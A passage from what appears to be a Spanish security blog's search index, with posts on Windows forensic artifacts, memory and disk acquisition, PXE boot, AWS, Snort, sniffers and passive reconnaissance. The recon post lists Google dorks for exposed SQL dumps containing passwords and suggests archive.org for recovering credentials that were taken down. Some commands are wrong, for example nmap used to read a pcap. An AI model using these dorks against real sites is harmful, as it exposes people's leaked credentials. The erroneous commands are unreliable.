máquinaDocumentos recientesNTUSER.DAT\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RecentDocsDocumentos ofimáticos recientesNTUSER.DAT\\Software\\Microsoft\\Office\\{Version}\\{Excel|Word}\\UserMRUEn este caso no vemos ni siquiera la carpeta office porque no tiene instalado el softwarePosición de lectura sobre el último documento abiertoNTUSER.DAT\\Software\\Microsoft\\Office\\Word\\Reading Locations\\Document X.Igualmente omitimos por no tener el software instaladoFicheros ofimáticos autoguardadosC:\\Usuarios\\\\AppData\\Roaming\\Microsoft\\{Excel|Word|Powerpoint}\\En este caso podemos acceder directamente desde FTK y de nuevo omitimos por no tener el softwareOpenSaveMRU: Ficheros que han sido abiertos o guardados dentro de una ventana WindowsNTUSER.DAT\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ComDlg32\\OpenSavedPidlMRUÚltimos comandos ejecutadosNTUSER.DAT\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRUNTUSER.DAT\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Policies\\RunMRUUserAssistKey: Programas ejecutados desde el EscritorioNTUSER.DAT\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\{GUID}\\CountEventos asociados a la barra de tareasNTUSER.DAT\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsageAplicaciones recientesSoftware\\Microsoft\\Windows\\Current Version\\Search\\RecentAppsEn el caso de esta máquina no se encuentra porque puede que no esté activadoDispositivos MTPC:\\users\\Appdata\\Local\\Temp\\WPDNSE\\{GUID}En este caso vemos que no existe ya que en la máquina no existía ningún dispositivo MTP conectadoAlmacenamiento USB. Identificadores de fabricante(VID) y de producto (PID)SYSTEM\\ControlSet001\\Enum\\USBSTORNombres de volúmenes USBSOFTWARE\\Microsoft\\Windows Portable Devices\\DevicesLocalizar el usuario que ha utilizado el USBNTUSER.DAT\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Mountpoints2Número de serie de volumen lógicoSoftware\\Microsoft\\Windows NT\\CurrentVersion\\EMDMgmtHay que tener en cuenta que todos estos datos solo existen si se han utilizado dispositivos de almacenamiento externosPrimera y última vez que se conectó el dispositivoSystem\\ControlSet001\\Enum\\USBSTOR\\{VEN_PROD_VERSION}\\{USBserial}\\Properties\\{83da6326-97a6-4088-9453-a1923f573b29}\\ServiciosSYSTEM\\ControlSet001\\ServicesHistórico de PowerShellC:Users\\{User}\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txtTareas programadasC:\\Windows\\TasksC:\\Windows\\System32\\TasksOtros artefactosDocumentos recientes (LinkParses o LeCMD)  LinkParser  LeCMDC:\\Users\\\\AppData\\Roaming\\Microsoft\\Windows\\RecentWindows PREFETCH (LeCMD)C:\\Windows\\PrefetchAutomatic &amp; Custom destinations (JumpListExplorer)  JumpList ExplorerC:\\Users\\\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\AutomaticDestinationsC:\\Users\\\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\CustomDestinationsUbicamos y descargamos las rutas con FTKEstas parecen estar vacíasAcceso y tiempos MAC a directorios (ShellbagExplorer)USRCLASS.DAT\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\BagsUSRCLASS.DAT\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\BagMRU DesktopNTUSER.DAT\\Software\\Microsoft\\Windows\\Shell\\BagMRUExtraemos el directorio donde se encuentra USRCLASS.DATPara verlas en crudo con el registroPero para poder interpretar el contenido de las ShellBags hacemos uso del siguiente softwareBase de datos Cortana en versiones anteriores a Windows 10.0.17763.55 (Sqlite studio)\\Users\\user_name\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_xxxx\\LocalState\\ESEDatabase_CortanaCoreInstance\\CortanaCireDb.datOmitimos este artefacto porque estamos usando Windows 11Notificaciones de WindowsC:\\Users\\{user_name}\\AppData\\Local\\Microsoft\\Windows\\Notifications\\wpndatabase.dbWindows StoreC:\\ProgramData\\Microsoft\\Windows\\AppRepository\\StateRepositoryDeployment.srdSoftware\\Microsoft\\Windows\\CurrentVersion\\Appx\\AppxAllUserStore\\Applications\\Software\\Microsoft\\Windows\\CurrentVersion\\Appx\\AppxAllUserStore\\Deleted\\Thumbnails (thumbviewer) &amp; Thumbcaché (thumbcacheviewer)  Thumbs Viewer  Thumbcache ViewerFicheros \"thumbs.db\"C:\\Users\\user\\AppData\\Local\\Microsoft\\Windows\\ExplorerPuede que no encontremos ningún archivo thumb.db pero si cachesPapelera de reciclaje (Rifiuti)  RifiutiEl concepto de esta herramienta es que como se observa a continuación el visualizado de los nombres de los archivos existentes en las papeleras de los diferentes usuarios es modificado por windows al ser enviados a la papelera.Este software se encarga de recuperar el nombre de ese archivo.OfficeFileCache &amp; OfficeBacktageEn ambos casos se trata de extraer metadatos de los documentos creados con el paquete office por lo que en esta ocasión vamos a saltar estos artefactos ya que no lo tenemos en nuestra máquinaOfficeFileCacheParser\\Users\\(Username)\\AppData\\Local\\Microsoft\\Office\\(Office Version)\\OfficeFileCacheOfficeBackstageParser\\{Users}\\AppData\\Local\\Microsoft\\Office\\16.0\\BackstageinAppNavCacheIP Pública  ETLParserC:\\Windows\\ServiceProfiles\\NetworkService\\AppData\\Local\\Microsoft\\Windows\\DeliveryOptimization\\Logs\\Podemos abrirlo con algun editor de hojas de cálculo igualmenteNota* Esa no es mi IP pública real, la he modificado por supuestoWindows SuperFetchC:\\Windows\\Prefetch\\Ag*.db  PECmdShimCache  AppCompatCacheParserSYSTEM\\CurrentControlSet\\Control\\SessionManager\\AppcompatCache\\AppCompatCacheAmCacheC:\\Windows\\AppCompat\\Programas\\Amcache.hveBAMSYSTEM\\CurrentControlSet\\Services\\bam\\UserSettings\\{SID}SYSTEM\\CurrentControlSet\\Services\\bam\\state\\UserSettings\\{SID}EventosC:\\Windows\\system32\\winevt\\Logs  EventLog ExplorerSRUM  Network usage viewC:\\Windows\\System32\\sru\\SRUDB.dat"
  },
  
  {
    "title": "Adquisición de Evidencias Volátiles",
    "url": "/posts/obtencion_volatil/",
    "categories": "Forense, Herramientas",
    "tags": "memoria, ram, windows, linux, dumpit, belkasoft, lime, avml",
    "date": "2024-11-08 12:58:38 +0100",
    





    
    "snippet": "IntroducciónEsta guía presenta diferentes herramientas y métodos para realizar volcados de memoria RAM en caliente en sistemas Windows y Linux. Se analizarán cuatro herramientas principales, sus ca...",
    "content": "IntroducciónEsta guía presenta diferentes herramientas y métodos para realizar volcados de memoria RAM en caliente en sistemas Windows y Linux. Se analizarán cuatro herramientas principales, sus características y procedimientos de uso.Configuración Previa en Windows  ¡Importante!  Para realizar volcados de memoria en Windows 10/11 es necesario desactivar la medida de seguridad de aislamiento del núcleo en la configuración de seguridad del dispositivo.Configuración de seguridad del dispositivo en WindowsHerramientas Seleccionadas1. DumpIT (Windows)Herramienta gratuita para Windows que permite realizar volcados de memoria de forma simple y directa.🔗 Descargar DumpITInterfaz de línea de comandos de DumpITCaracterísticas principales:  Ejecución simple con un solo comando  Debe ejecutarse como administrador  El volcado se realiza en la misma ubicación del ejecutable2. Belkasoft RAM Capturer (Windows)Programa gratuito que requiere registro previo para su descarga oficial.🔗 Descargar Belkasoft RAM CapturerInterfaz de Belkasoft RAM Capturer mostrando la selección de rutaCaracterísticas principales:  Disponible en versiones de 32 y 64 bits  Interfaz que permite seleccionar la ruta de destino  Proceso de volcado simplificado3. LiME (Linux)Proyecto open source para volcado de RAM en sistemas Linux, incluyendo Android.🔗 Repositorio de LiMEgit clone https://github.com/504ensicsLabs/LiME.gitProceso de compilación de LiME y archivo resultanteCaracterísticas principales:  Compatible con múltiples distribuciones Linux  Soporta volcado remoto mediante netcat  Utiliza el kernel de forma directa  Soporta formatos raw y lime4. Microsoft AVML (Linux)Herramienta desarrollada por Microsoft para volcado de RAM en sistemas Linux.🔗 Repositorio de AVMLCompilación de AVMLComparación de tamaños de volcado con y sin compresión en AVMLCaracterísticas principales:  Distribuida como binario ejecutable  Incluye opciones de compresión  No requiere instalaciónConclusiones y RecomendacionesPara Windows:DumpIT es la opción recomendada por su mínimo impacto en el sistema y facilidad de uso. No requiere instalación y puede ejecutarse directamente desde un dispositivo externo.Para Linux:Aunque LiME es una herramienta muy potente y compatible, AVML puede ser más práctica en muchos casos ya que:  No requiere instalación de dependencias  Se ejecuta como binario independiente  No necesita modificar módulos del kernel"
  },
  
  {
    "title": "Arranque de Herramientas Forenses desde la Red (PXE)",
    "url": "/posts/arranque_en_red_IPXE/",
    "categories": "Forense, Red",
    "tags": "pxe, kali, forensics, ipxe",
    "date": "2024-11-05 12:58:38 +0100",
    





    
    "snippet": "Configuración manual de IPXEInstalación de Requisitossudo suapt update &amp;&amp; apt upgrade &amp;&amp; apt install dnsmasq ipxeConfiguración de DNSMASQsudo nano /etc/dnsmasq.confdnsmasq.confDonde...",
    "content": "Configuración manual de IPXEInstalación de Requisitossudo suapt update &amp;&amp; apt upgrade &amp;&amp; apt install dnsmasq ipxeConfiguración de DNSMASQsudo nano /etc/dnsmasq.confdnsmasq.confDonde la interfaz y la IP dependen de la máquina.Creación de Directoriossudo mkdir -p /tftpboot/kalisudo cp /usr/lib/ipxe/undionly.kpxe /tftpboot/Descarga y Configuración de la ISOsudo mkdir -p /mnt/isowget https://cdimage.kali.org/kali-2024.3/kali-linux-2024.3-live-amd64.isosudo mount -o loop kali-linux-2024.3-live-amd64.iso /mnt/isosudo cp /mnt/iso/live/vmlinuz /tftpboot/kali/sudo cp /mnt/iso/live/initrd.img /tftpboot/kali/sudo cp /mnt/iso/live/filesystem.squashfs /tftpboot/kali/Configuración de boot.ipxesudo nano /tftpboot/boot.ipxeContenido del archivo:#!ipxe:retry_bootecho Iniciando Kali Linux...# Configuración de red explícitaset net0/ip 192.168.244.109set net0/netmask 255.255.255.0set net0/gateway 192.168.244.128# Intenta cargar kernelkernel tftp://${next-server}/kali/vmlinuz || goto retry_bootinitrd tftp://${next-server}/kali/initrd.img || goto retry_bootimgargs vmlinuz initrd=initrd.img boot=live components fetch=tftp://${next-server}/kali/filesystem.squashfsboot || goto retry_bootConfiguración de Permisossudo chmod -R 755 /tftpbootsudo chown -R nobody:nogroup /tftpbootSolución de Error de Timeoutsudo nano /etc/default/dnsmasqAñadir la siguiente línea:DNSMASQ_OPTS= \"--log-facility=/var/log/dnsmasq.log --tftp-max-connections=100 --tftp-timeout=600\"Reinicio del Serviciosudo systemctl restart dnsmasq  Importante            El problema de este proceso es que al usar tftp la transmisión es muy lenta y eso sumado a que el tamaño de la iso de Kali Live son unos 4.5Gb no es lo más óptimo.              Otra cosa a tener en cuenta es que es muy fácil que en el proceso algún parámetro no quede bien ajustado y se rompe continuamente la conexión o no se llegue a establecer.              En este proceso la iso del sistema se debe cargar en memoria por lo que la máquina debera tener suficiente espacio en la memoria RAM.      "
  },
  
  {
    "title": "Clonado en caliente y con cifrado",
    "url": "/posts/evidencias_en_caliente/",
    "categories": "Forense, Discos",
    "tags": "forensics, clonado, bitlocker, tpm",
    "date": "2024-11-01 12:58:38 +0100",
    





    
    "snippet": "Tabla de Contenidos  Configuración TPM  Clonación de Disco con DD y FTK  Clonación de Directorio con FTK Imager  Proceso de Cifrado  Clonado del disco cifrado  Clonado del directorio dentro del dis...",
    "content": "Tabla de Contenidos  Configuración TPM  Clonación de Disco con DD y FTK  Clonación de Directorio con FTK Imager  Proceso de Cifrado  Clonado del disco cifrado  Clonado del directorio dentro del disco cifradoConfiguración TPMConfiguración en Máquina VirtualPara máquinas virtuales, es necesario realizar una configuración especial del TPM antes de poder activar BitLocker.  La simulación del chip TPM es necesaria en entornos virtuales.Configuración del TPM en entorno virtualClonación de Disco con DD y FTKPaso 1: Preparación del EntornoAsegúrese de tener en cuenta el tamaño de los discos para el sistema operativo Windows 10 Pro y abra CMD como administrador.  Siempre verifique los requisitos de espacio en disco antes de comenzar el proceso de clonación.Listado de discos físicos en CMDComando de clonado DDMontado en FTK ImagerClonación de Directorio con FTK Imager  Nota: Este proceso excluye archivos eliminados, metadatos y archivos del sistema.Proceso de clonación de directorioProceso de CifradoCifrado con BitlockerEl proceso requiere modificar una política de BitLocker para permitir el uso en dispositivos TPM no compatibles.  Guarde la clave de recuperación en un lugar seguro.Proceso de configuración de BitLockerProceso de CifradoEl cifrado del disco se realizará al reiniciar el equipo.Progreso del proceso de cifradoProceso de clonado en disco con BitLockerFTK ImagerAhora hacemos una imagen de clonado del disco completo con FTK.  Clonará el disco completo encriptadoVerificación de integridad mediante hashAcceso al Contenido ClonadoAhora si montamos la imagen veremos como de las tres particiones que hay en el disco únicamente la de boot y recuperación de windows son visibles. Sin embargo vemos como la partición del disco principal de sistema no es reconocida.Verificación de acceso al contenido encriptado clonadoClonado directorio cifrado dentro de disco con BitLockerSi de igual forma hacemos un clonado únicamente del directorio users del disco C.  En este caso vemos que el clonado si es accesible debido a que el clonado es únicamente del directorio y no del disco completo por lo que los datos son obtenidos ya descifrados.Directorio dentro del disco cifrado clonado"
  },
  
  {
    "title": "Clonado de Disco por Red",
    "url": "/posts/clonado_de_disco_red/",
    "categories": "Forense, Discos",
    "tags": "forense, clonado, network",
    "date": "2024-10-20 13:58:38 +0200",
    





    
    "snippet": "Configuración InicialPara comenzar vamos a plantear la máquina de la que debemos obtener las evidencias que en este caso es llamada DC-1.Máquina DC-1 con 4GB de disco duro en red privada host-onlyC...",
    "content": "Configuración InicialPara comenzar vamos a plantear la máquina de la que debemos obtener las evidencias que en este caso es llamada DC-1.Máquina DC-1 con 4GB de disco duro en red privada host-onlyComo observamos tenemos una máquina ligera con tan solo 4Gb de disco duro ya que se trata de un “mini” servidor vulnerable pero para el caso nos servirá.Máquina Kali y Parrot en la misma red local  Más adelante se añade una nota al proceso de clonado por netcat porque han surgido complicaciones con el sistema inicial de la estación forense parrot. Así que en esa parte se hace un cambio a esta máquina kali.Preparación del EntornoPara comenzar la máquina forense debe estar ya encendida y antes de abrir la máquina de las evidencias vamos a asignarle el inicio de kali live.Inicio de máquina en modo Kali LiveRecordad iniciar la máquina en modo forense.Comprobación de conectividad entre máquinasVerificación de ConectividadComprobación de conectividad entre máquinasIdentificación de DiscosListado de discos disponiblesClonado por SSHEn este caso haremos uso de una conexión mediante SSH para la transferencia de datos.Configuración de SSH en Parrot OS# 1. Verificar instalación SSHsudo apt install openssh-server# 2. Habilitar e iniciar servicio SSHsudo systemctl enable sshsudo systemctl start ssh# 3. Verificar estado del serviciosudo systemctl status ssh# 4. Configurar firewallsudo ufw allow 22/tcpsudo ufw enable# 5. Verificar puertosudo netstat -tulpn | grep 22Proceso de clonado mediante SSH  Este mismo proceso se puede realizar comprimiendo la clonación para que pese menos:  dd if=/dev/sdaX | gzip -1 - | ssh usuario@estacion_forense \"dd of=/ruta/imagen.gz\"  Clonado por NetcatEn este caso haremos uso de netcat para el envío de los datos por red.Se trata de un proceso más rápido debido a que el envío de datos se hace por el protocolo UDP pero es más susceptible a fallos o corrupción de paquetes en tránsito debido a la naturaleza del mismo.En este proceso he tenido problemas con la máquina original utilizada como estación forense por lo que se ha cambiado rápidamente a un kali linux ya que la original era un Parrot OS. El problema reside en la configuración del firewall en parrot y aun no he dado con la solución.Proceso de clonado mediante NetcatVerificación de HashComparación de hash entre origen y destino"
  },
  
  {
    "title": "Guía de Procedimiento - Adquisición de Evidencias (Cold Clone)",
    "url": "/posts/clonado_de_disco/",
    "categories": "Forense, Discos",
    "tags": "forense, clonado, evidencias",
    "date": "2024-10-10 13:58:38 +0200",
    





    
    "snippet": "Descripción GeneralPaso 1: Configuración de la Máquina VirtualDescarga el archivo proporcionado y configura el segundo disco en el programa de virtualización.Instrucciones DetalladasAñade el disco ...",
    "content": "Descripción GeneralPaso 1: Configuración de la Máquina VirtualDescarga el archivo proporcionado y configura el segundo disco en el programa de virtualización.Instrucciones DetalladasAñade el disco descargado con la opción “add” y arranca la máquina con un live ISO de Kali Linux. Selecciona la opción “forensic” para evitar contaminación del disco.Configuración inicial del discoSelección de disco virtualConfiguración completadaArranque en modo forensePaso 2: Verificación de DiscosEn Kali Linux, usa el siguiente comando para listar los discos disponibles:fdisk -lInstrucciones DetalladasVerifica que puedes ver el disco de evidencia y el disco contenedor. Asegúrate de que hay espacio suficiente en el disco contenedor.Resultado del comando fdisk -lPaso 3: Cálculo del Hash de la EvidenciaAntes de empezar con el clonado o la creación de una imagen, calcula el hash del disco de evidencia:sha512sum /dev/sdX    # Reemplaza /dev/sdX con el dispositivo adecuadoHash calculado de la evidencia originalPaso 4: Clonado del DiscoEjecuta el comando de clonado:dd if=/dev/sdX of=/dev/sdY bs=4MVerifica el hash del disco clonado:sha512sum /dev/sdYProceso de clonado en ejecuciónVerificación del hash del clonadoPaso 5: Creación de Imagen del DiscoCrea una imagen del disco de evidencia:dd if=/dev/sdX of=/ruta/a/imagen.img bs=4MVerifica el hash de la imagen:sha512sum /ruta/a/imagen.imgInicio del proceso de imagenProgreso de la imagenVerificación de la imagenComprobación finalProceso completado"
  },
  
  {
    "title": "Amazon AWS",
    "url": "/posts/AmazonAWS/",
    "categories": "Cloud, AWS",
    "tags": "aws, cloud, deployment, web-application",
    "date": "2024-06-20 00:00:00 +0200",
    





    
    "snippet": "Despliegue de un entorno real en la nube (AWS)Escenario de despliegueAplicación web para el despliegue: https://github.com/aws-samples/simple-phonebook-web-applicationPasos para el despliegue      ...",
    "content": "Despliegue de un entorno real en la nube (AWS)Escenario de despliegueAplicación web para el despliegue: https://github.com/aws-samples/simple-phonebook-web-applicationPasos para el despliegue      Creación y configuración de la VPC        Creación y configuración de la subred privada        Creación y configuración de las subredes públicas        Creación y configuración del Internet Gateway        Creación y configuración de una Route Table para la subred privada. Asociación de la nueva route table a la subred privada. No debe añadirse ninguna ruta adicional a las que se crean por defecto (ten en cuenta que la ruta por defecto que indica que el tráfico destinado a 10.0.0.0/16 será enrutado localmente es lo que permite que exista conectividad entre todas las subredes que se encuentran en la VPC).        Creación y configuración de un Route Table para las subredes públicas. Asociación de la nueva route table a la subred pública. Creación de una nueva ruta que redireccione el tráfico dirigido a 0.0.0.0 hacia el Internet Gateway.        Creación y configuración de Security Groups: Creación de dos Security Groups que controlarán las conexiones entrantes y salientes hacia la aplicación web y el servidor de base de datos.    Security Group para la aplicación web:          Crear regla de entrada para permitir tráfico HTTP desde cualquier dirección IPv4      Crear regla de entrada para permitir tráfico SSH desde cualquier dirección IPv4        Security Group para la base de datos:          Crear regla de entrada para permitir el tráfico MySQL desde el Security Group de la aplicación web        Creación y configuración de los servidores de aplicación en EC2:Script user data para crear las instancias:#!/bin/bashyum -y install httpd php mysql php-mysqlcase $(ps -p 1 -o comm | tail -1) insystemd) systemctl enable --now httpd ;;init) chkconfig httpd on; service httpd start ;;*) echo \"Error starting httpd (OS not using init or systemd).\" 2&gt;&amp;1esacif [ ! -f /var/www/html/bootcamp-app.tar.gz ]; thencd /var/www/htmlwget https://s3.amazonaws.com/immersionday-labs/bootcamp-app.tartar xvf bootcamp-app.tarchown apache:root /var/www/html/rds.conf.phpfiyum -y update      Creación y configuración del Target Group        Creación y configuración del Application Load Balancer        Creación y configuración del servidor de base de datos MySQL  "
  },
  
  {
    "title": "Snort",
    "url": "/posts/Snort/",
    "categories": "Defensivo, IDS",
    "tags": "snort, ids, seguridad, monitorización",
    "date": "2024-01-19 12:00:00 +0100",
    





    
    "snippet": "¿Qué es Snort?Es un IDS open source que se encarga de detectar actividad maliciosa en un entorno de red y es el más utilizado a nivel internacional de estilo OPEN SOURCE.Ubicación y ConfiguraciónSe...",
    "content": "¿Qué es Snort?Es un IDS open source que se encarga de detectar actividad maliciosa en un entorno de red y es el más utilizado a nivel internacional de estilo OPEN SOURCE.Ubicación y ConfiguraciónSe configura en un punto de la infraestructura por donde pasa el tráfico de red que se intercambia entre los sistemas.Configuración de RedEn una subred la dirección asignada como 192.168.xxx.1 es la por defecto del enrutador, que administra el tráfico de los dispositivos conectados.Funcionamiento con Máquina HostEn este caso la máquina HOST es la encargada de administrar estas peticiones así que si se instala SNORT se podrá monitorizar el tráfico entre la máquina objetivo y la atacante para que así podamos aplicar medidas para evitar estos sistemas de seguridad.Uso BásicoTras descargar y configurar Snort, en PowerShell:./snort.exe/ -WEste comando se utiliza para mostrar las interfaces y seleccionar la que nos interese.Para iniciar el monitoreo:.\\snort.exe -i 5 -A console -c C:\\Snort\\etc\\snort.conf"
  },
  
  {
    "title": "Sniffers",
    "url": "/posts/sniffers/",
    "categories": "Reconocimiento, Sniffers",
    "tags": "sniffers, wireshark, tcpdump, network-analysis",
    "date": "2024-01-19 00:00:00 +0100",
    





    
    "snippet": "ConceptoDentro de una interconexión de ordenadores denominada red los equipos son hosts o nodos.Cuando estamos dentro de esta red podemos intercambiar datos por cable o WiFi.Estos datos son bytes y...",
    "content": "ConceptoDentro de una interconexión de ordenadores denominada red los equipos son hosts o nodos.Cuando estamos dentro de esta red podemos intercambiar datos por cable o WiFi.Estos datos son bytes y se deben interpretar para lo que se utilizan protocolos de red, que se trata de un conjunto de reglas que se aplica sobre la información de red para interpretarla.Un sniffer monitoriza todo el tráfico de red tanto entrante como saliente dentro de la red.Todos estos datos que se intercambian con los diferentes nodos o redes de internet se denominan paquetes de red.Hay veces que no podemos utilizar técnicas de reconocimiento activas o por ejemplo, de detección de vulnerabilidades o análisis de vulnerabilidades, porque los sistemas que hay conectados a la red son tan antiguos y tan sensibles que ese tráfico adicional, ese tráfico anómalo que generan estas herramientas de detección activa, pueden provocar en algún caso la in disponibilidad de alguno de los sistemas y que esto afecte a la infraestructura de red o a la infraestructura tecnológica en general.Por lo tanto, en estos casos, una de las opciones para tratar de dirigir un poquito más nuestros ataques a la hora de explotar una cierta vulnerabilidad puede ser coger un sniffer, colocarlo dentro de esa infraestructura, simplemente copiando ese tráfico de red, es decir, monitorizando toda la actividad de la red y en función de los protocolos que comienza a interceptar.En función, por ejemplo, de algunos valores que tienen determinados campos de las capas de los paquetes de red, nosotros podemos identificar qué aplicaciones están instaladas en los diferentes nodos de esa red y además, qué programas utilizan y qué versiones de esos programas.WiresharkEs una herramienta de las más conocidas y potentes que por defecto en Kali ya viene instalado.Los paquetes se dividen en capasPara poder visualizar los paquetes en los que se ha realizado la consulta de los nombres DNS damos click en la lupaAquí es donde se realiza la petición para resolver ese nombre de dominioAquí vemos las respuestas con los hostnames y sus IP tanto IPV4 como IPV6 como se observa en el siguiente paqueteBueno, sabéis que HTTP va por encima de la capa TCP y muchas veces cuando nosotros estamos intercambiando información que tiene un tamaño muy grande, como puede ser por ejemplo una página web, al final nosotros hacemos una petición al servidor web, le decimos.Oye, mándame esa página web.El servidor web te manda a la página web.Pero claro, una página web es un montón de información.Vale, entonces los paquetes de red o la cantidad de información que va en una ristra de bits que se intercambia, tiene un tamaño limitado. No es un tamaño infinito. Y por lo tanto, si la página web o la información que intercambiamos es demasiado grande, no podemos mandarla toda en un mismo segmento, en una misma ristra de bits o en un mismo paquete de red.Por lo tanto, tenemos que fragmentar de alguna manera esa información e ir mandándola en segmentos diferentes o en paquetes de red diferentes.TCPDumpSe diferencia de wireshark en que utiliza un interfaz de consola de comandos.Estas son solo algunas de las opciones que ofrece, en su documentación se pueden encontrar muchas más.sudo tcpdump -Dsudo tcpdump -i eth0Mostrar mas información:sudo tcpdump -v -i eth0sudo tcpdump icmp -i eth0sudo tcpdump host 185.230.63.107 -i eth0Guardar la captura para ser posteriormente analizada con Wiresharksudo tcpdump -i eth0 -w Desktop/capture.pcapAbrir la captura pero con TCPDump y filtrar protocolossudo nmap -n port 53 -v -r capture.pcapsudo nmap -n port 80 -v -r capture.pcap | grep gamivo.com"
  },
  
  {
    "title": "Recopilación pasiva",
    "url": "/posts/recopilacion_pasiva/",
    "categories": "Reconocimiento, Recopilación, Pasiva",
    "tags": "passive-recon, google-dorks, shodan, censys, whois, maltego",
    "date": "2024-01-19 00:00:00 +0100",
    





    
    "snippet": "Google Hacking/DorkingSe usarán motores de búsqueda como Google, Bing, DuckGo, etc mediante el uso de una serie de comandos y operaciones booleanas para encontrar información específica que los mot...",
    "content": "Google Hacking/DorkingSe usarán motores de búsqueda como Google, Bing, DuckGo, etc mediante el uso de una serie de comandos y operaciones booleanas para encontrar información específica que los motores indexan pero no es tan pública.Comandos específicos para googlehttps://gist.github.com/zachbrowne/489762a6852abb24f9e3https://www.exploit-db.com/google-hacking-databaseRestringir la búsqueda unicamente al sitio web indicado, nada de webs donde se le haga referencia:site:website.comApuntar a un tipo de archivo concreto o contenido:site:website.com filetype:pdfGoogle dorksTipo de archivofiletype:sql \"MySQL dump\"filetype:sql \"MySQL dump\" (pass|password|passwd|pwd)Buscar parámetros en la urlinurl:index.php?id=Comandos principales que podemos utilizar con Google. Hay que tener en cuenta que todos ellos deben ir seguidos (sin espacios) de la consulta que quiere realizarse:define:términoSe muestran definiciones procedentes de páginas web para el término buscado.filetype:términoLas búsquedas se restringen a páginas cuyos nombres acaben en el término especificado. Sobretodo se utiliza para determinar la extensión de los ficheros requeridos. Nota: el comando ext:término se usa de manera equivalente.site:sitio/dominioLos resultados se restringen a los contenidos en el sitio o dominio especificado. Muy útil para realizar búsquedas en sitios que no tienen buscadores internos propios.link:urlMuestra páginas que apuntan a la definida por dicha url. La cantidad (y calidad) de los enlaces a una página determina su relevancia para los buscadores. Nota: sólo presenta aquellas páginas con pagerank 5 o más.cache:urlSe mostrará la versión de la página definida por url que Google tiene en su memoria, es decir, la copia que hizo el robot de Google la última vez que pasó por dicha página.info:urlGoogle presentará información sobre la página web que corresponde con la url.related:urlGoogle mostrará páginas similares a la que especifica la url. Nota: Es difícil entender que tipo de relación tiene en cuenta Google para mostrar dichas páginas. Muchas veces carece de utilidad.allinanchor:términosGoogle restringe las búsquedas a aquellas páginas apuntadas por enlaces donde el texto contiene los términos buscados.inanchor:términoLas búsquedas se restringen a aquellas apuntadas por enlaces donde el texto contiene el término especificado. A diferencia de allinanchor se puede combinar con la búsqueda habitual.allintext:términosSe restringen las búsquedas a los resultados que contienen los términos en el texto de la página.intext:términoRestringe los resultados a aquellos textos que contienen término en el texto. A diferencia de allintext se puede combinar con la búsqueda habitual de términos.allinurl:términosSólo se presentan los resultados que contienen los términos buscados en la url.inurl:términoLos resultados se restringen a aquellos que contienen término en la url. A diferencia de allinurl se puede combinar con la búsqueda habitual de términos.allintitle:términosRestringe los resultados a aquellos que contienen los términos en el título.intitle:términoRestringe los resultados a aquellos documentos que contienen término en el título. A diferencia de allintitle se puede combinar con la búsqueda habitual de términos.Operadores Booleanos Google HackingGoogle hace uso de los operadores booleanos para realizar búsquedas combinadas de varios términos. Esos operadores son una serie de símbolos que Google reconoce y modifican la búsqueda realizada:\" \" - Busca las palabras exactas.- - Excluye una palabra de la búsqueda. (Ej: gmail -hotmail, busca páginas en las que aparezca la palabra gmail y no aparezca la palabra hotmail)OR (|) - Busca páginas que contengan un término u otro.+ - Permite incluir palabras que Google por defecto no tiene en cuenta al ser muy comunes (en español: \"de\", \"el\", \"la\".....). También se usa para que Google distinga acentos, diéresis y la letra ñ, que normalmente son elementos que no distingue.* - Comodín. Utilizado para sustituir una palabra. Suele combinarse con el operador de literalidad (\" \").ShodanSurgió en 2009 y en este caso no indexa las palabras como hace el motor de google u otros motores de búsqueda sino que recorre todo internet buscando información sobre el dominio que busquemos o las ip que indiquemos.Esta herramienta consigue los datos en gran parte de los banners de los dispositivos que se encuentran conectados a internet, analiza sus puertos y servicios que posteriormente shodan indexa esta información.Es importante tener en cuenta que en este momento no buscamos webs ni archivos indexados sino información en los banners que generan los servicios al intentar comunicarte con ellos. Shodan cuenta con algunos comandos propios.Filtros más relevantes para el uso de Shodanafter: Only show results after the given date (dd/mm/yyyy) stringasn: Autonomous system number stringbefore: Only show results before the given date (dd/mm/yyyy) stringcategory: Available categories: ics, malwarestringcity: Name of the city stringcountry: 2-letter country code stringgeo: Accepts between 2 and 4 parameters. If 2 parameters: latitude, longitude. If 3 parameters: latitude, longitude, range. If 4 parameters: top left latitude, top left longitude, bottom right latitude, bottom right longitude.hash: Hash of the data property integerhas_ipv6: True/False booleanhas_screenshot: True/False booleanserver: Devices or servers that contain a specific server header flag stringhostname: Full host name for the device stringip: Alias for net filter stringisp: ISP managing the netblock stringnet: Network range in CIDR notation (ex.199.4.1.0/24) stringorg: Organization assigned the netblock stringos: Operating system stringport: Port number for the service integerpostal: Postal code (US-only) stringproduct: Name of the software/product providing the banner stringregion: Name of the region/state stringstate: Alias for region stringversion: Version for the product stringvuln: CVE ID for a vulnerability stringEjemplo de comandos shodan en una búsquedaftp anonymous login ok country:\"US\" port:\"21\"Repositoriohttps://github.com/jakejarvis/awesome-shodan-queriesCensysHerramienta similar a Shodan. La diferencia es la manera en la que indexa los datos. Censys escanea diariamente internet con Zmap y Zgrab lo que permite realizar una indexación de diferente manera y normalmente más actualizada.https://search.censys.io/WhoisLas organizaciones y usuarios dan de alta todos los años diferentes nombres de dominio para servir los servicios.Cuando se da de alta un dominio se deben dar datos personales que se almacenan en una base de datos que se denominan “WhoIS”No es un base de datos centralizada, son varias y son gestionadas por las entidades que registran los nombres de dominios que se adquieren.Para realizar estas consultas se pueden usar varias herramientas.whois -hA día de hoy estas bases de datos no son de mucha utilidad porque los datos pueden ser privados y los que se muestran no son los correctos.ArchiveCuando se encuentra información sensible publicada en internet y se reporta la información, lo más común es que la empresa retire los datos aunque no siempre cambian las credenciales por lo que si se puede acceder al histórico de, por ejemplo github, podremos volver a tener esas credenciales.Para esto podemos utilizar la aplicación webhttps://archive.org/Se trata de un frontend a una base de datos muy extensa que contiene muchos datos como archivos, sistemas, etc así como snapshots de páginas web.Recorre internet recopilando los estados 